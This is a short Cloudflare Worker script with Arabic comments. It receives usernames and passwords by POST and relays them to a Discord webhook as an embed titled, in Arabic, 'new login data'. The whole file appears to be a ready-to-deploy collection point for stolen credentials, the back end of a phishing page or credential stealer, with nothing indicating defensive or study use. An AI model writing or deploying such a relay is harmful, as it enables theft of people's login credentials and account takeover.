export default {
  async fetch(request, env, ctx) {
    // التأكد من أن الطلب من نوع POST فقط
    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405 });
    }

    try {
      // استقبال البيانات من برنامجك
      const data = await request.json();
      const { username, password } = data;

      // قراءة رابط الويب هوك من المتغيرات السرية (Secrets) في Cloudflare
      const discordWebhookUrl = env.DISCORD_WEBHOOK_URL;

      if (!discordWebhookUrl) {
        return new Response("Webhook URL not configured", { status: 500 });
      }

      // إرسال البيانات إلى ديسكورد
      const payload = {
        embeds: [{
          title: "🚨 بيانات دخول جديدة",
          color: 0xff0000,
          fields: [
            { name: "اسم المستخدم", value: `\`${username}\``, inline: true },
            { name: "كلمة المرور", value: `\`${password}\``, inline: true },
            { name: "الوقت", value: new Date().toLocaleString() }
          ]
        }]
      };

      await fetch(discordWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      return new Response("Success", { status: 200 });
    } catch (e) {
      return new Response("Error processing request", { status: 500 });
    }
  },
};